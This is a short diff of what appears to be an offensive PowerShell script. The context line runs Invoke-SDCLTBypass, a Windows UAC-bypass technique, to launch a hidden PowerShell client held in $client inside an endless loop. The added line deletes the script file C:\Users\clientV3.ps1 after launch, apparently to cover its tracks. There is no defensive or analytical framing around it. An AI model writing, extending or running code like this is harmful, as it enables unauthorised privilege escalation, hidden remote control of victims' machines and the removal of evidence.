@@ -113,3 +113,4 @@ while ($true) {
 
 
 Invoke-SDCLTBypass -command  "powershell -nop -window 1 $client " -force
+Remove-Item C:\Users\clientV3.ps1
